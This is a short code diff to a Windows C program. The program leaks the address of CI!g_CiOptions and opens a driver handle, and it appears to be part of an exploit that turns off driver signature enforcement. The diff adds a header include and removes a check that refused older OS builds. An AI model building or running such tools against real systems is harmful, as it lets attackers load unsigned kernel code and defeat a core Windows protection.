@@ -5,6 +5,7 @@
 !*/
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
+#include <winternl.h>
 #include <stdio.h>
 #include "util.h"
 #include "ci.h"
@@ -29,14 +30,6 @@ int main(int argc, char **argv)
     if ( (CigOptsBase = GetCiOptions1(CiImageBase)) != NULL )
     {
       printf("[+] Leaked CI!g_CiOptions @ %p\n", CigOptsBase);
-
-      PebPtr = NtCurrentTeb->ProcessEnvironmentBlock;
-
-      if ( PebPtr->OSBuildNumber < 16299 ) {
-	      printf("[ ] Currently does not support anything less than build 16299\n");
-	      return 0;
-      };
-
 
       if ( (hDriver = GetHandle()) != NULL ) 
       {
